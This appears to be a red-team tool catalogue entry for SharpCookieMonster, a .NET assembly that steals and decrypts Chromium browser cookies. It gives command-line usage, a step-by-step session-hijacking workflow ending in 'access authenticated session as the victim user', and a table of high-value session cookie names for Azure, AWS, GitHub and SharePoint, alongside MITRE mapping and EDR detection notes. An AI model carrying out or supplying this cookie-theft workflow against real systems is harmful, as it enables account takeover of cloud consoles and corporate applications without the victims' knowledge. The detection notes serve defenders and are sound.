---
name: SharpCookieMonster
category: credential-access
subcategories: [browser-cookies, session-tokens, web-credentials]
tradecraft_tags: [cookies, browser, session-token, chromium, edge, chrome, dotnet, apollo-runnable]
mitre_attack:
  - id: T1539
    name: Steal Web Session Cookie
source:
  url: https://github.com/m0rv4i/SharpCookieMonster
  license: Unknown
  maintained: false
binary_type: .net-assembly
binary_filename: SharpCookieMonster.exe
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  Browser database access from non-browser processes generates file access events
  (Sysmon Event 11 for the SQLite database read). Behavioral EDR specifically monitors
  browser database access from non-browser processes as credential theft signal.
usage_examples:
  - description: Extract Chrome cookies (decrypted via DPAPI)
    args: "SharpCookieMonster.exe --browser chrome"
  - description: Extract Edge cookies
    args: "SharpCookieMonster.exe --browser edge"
  - description: Extract all Chromium-based browser cookies
    args: "SharpCookieMonster.exe --all"
  - description: Filter for specific domain cookies (for session hijacking)
    args: "SharpCookieMonster.exe --browser chrome --domain github.com"
opsec_notes: |
  Browser cookie extraction is highly valuable for session hijacking — grabbing
  authenticated session cookies allows accessing web applications AS the logged-in user
  without credentials. This is particularly powerful for:
  - Internal web applications (SharePoint, intranet portals)
  - Cloud console sessions (AWS Console, Azure Portal)
  - Development tools (GitHub, GitLab, Azure DevOps)
  The extraction itself (SQLite read + DPAPI decrypt) is detectable by behavioral EDR.
gotchas: |
  Browser must not have the database locked (Chrome/Edge must not be running, or use
  shadow copy approach). Chrome v80+ uses an AES key stored in the "Local State" file,
  encrypted by DPAPI — SharpCookieMonster handles this decryption. Short-lived session
  cookies expire; cookies with HttpOnly flag can't be used via XSS but CAN be used
  via cookie injection tools (cookie-editor browser extension or curl -b).
related_ttps: [sharpchromium, sharpdpapi, credential-hunting-checklist]
alternatives: [sharpchromium, sharpdpapi-target-chrome]
common_args:
  --browser:
    description: Target browser
    typical_values: [chrome, edge, brave, opera]
    required: false
  --all:
    description: Extract from all detected Chromium-based browsers
    typical_values: [flag-only]
  --domain:
    description: Filter cookies by domain
    typical_values: ["github.com", "portal.azure.com", "console.aws.amazon.com"]
last_updated: 2026-05-29
---

# SharpCookieMonster

A .NET assembly for extracting and decrypting browser cookies from Chromium-based
browsers. Session cookies enable session hijacking for web applications without
knowing the user's password — particularly valuable for cloud console access
(AWS, Azure) and internal web applications.

## Session Hijacking Workflow

```
1. Extract cookies:
   SharpCookieMonster.exe --browser chrome --domain portal.azure.com

2. Note the session cookie name and value
   (typically: .AspNetCore.Cookies, ESTSAUTH, ARRAffinity, etc.)

3. Inject into browser on attacker machine:
   Using browser extension (EditThisCookie, Cookie-Editor)
   OR: curl -b "session_name=session_value" https://target

4. Access authenticated session as the victim user
```

## High-Value Cookie Targets

| Domain | Cookie | Notes |
|--------|--------|-------|
| portal.azure.com | ESTSAUTH, ESTSAUTHPERSISTENT | Azure portal session |
| console.aws.amazon.com | aws-session-token | AWS console session |
| github.com | user_session | GitHub session |
| dev.azure.com | VstsSession | Azure DevOps |
| *.sharepoint.com | SPFreshCookie, OIDCAuth | SharePoint/O365 |
| Internal app | (varies) | Check domain-specific cookie names |
